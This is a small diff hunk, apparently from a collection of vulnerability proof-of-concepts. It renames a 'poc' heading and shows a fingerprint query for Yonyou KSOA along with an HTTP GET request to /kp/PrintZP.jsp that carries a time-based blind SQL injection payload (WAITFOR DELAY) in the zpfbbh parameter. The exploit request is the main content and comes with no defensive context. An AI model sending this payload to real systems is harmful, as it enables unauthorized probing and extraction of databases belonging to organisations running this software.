@@ -8,7 +8,7 @@
 app="用友-时空KSOA"
 ```
 
-## poc
+## POC
 
 ```yaml
 GET /kp/PrintZP.jsp?zpfbbh=1%27+IF(LEN(db_name())>4)+WAITFOR+DELAY+%270:0:2%27+--+ HTTP/1.1
